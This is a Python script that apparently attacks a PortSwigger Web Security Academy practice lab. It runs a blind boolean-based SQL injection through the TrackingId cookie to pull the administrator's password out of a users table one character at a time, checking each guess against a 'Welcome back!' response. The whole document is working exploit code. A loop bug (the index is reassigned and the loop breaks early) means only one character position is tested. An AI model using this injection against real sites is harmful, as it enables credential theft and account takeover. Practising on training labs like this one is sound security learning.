import requests
import urllib3

# Suppress the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0a7600e00484b9cd811e113700d10067.web-security-academy.net/'

headers = {
    'Host': '0a7600e00484b9cd811e113700d10067.web-security-academy.net',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"macOS"',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9'
}

def try_chr():
  cookies = dict();
  cookies['session'] = '1s7JUC7PcZOZf2DhcRjtMCQgZbhDswZt'
  size = 20
  for i in range(size):
    i = 2
    num_chr = 1
    #import ipdb; ipdb.set_trace()
    #print(f"Initial num_chr = {num_chr:03d}, {i+1:02d}: ", end='')
    print(f"{i+1:02d}: ", end='')
    while(num_chr<128):
      cookies['TrackingId'] = f"""'+or+ASCII(substring((select+Password+from+users+where+lower(Username)='administrator'),{i+1},1))={num_chr}+--+"""

      response = requests.get(url, headers=headers, cookies=cookies, verify=False)

      if 'Welcome back!' in response.text:
        print(chr(num_chr))
        break
      else:
        num_chr += 1
    if num_chr==128:
      print("空", end='')
    break
try_chr()
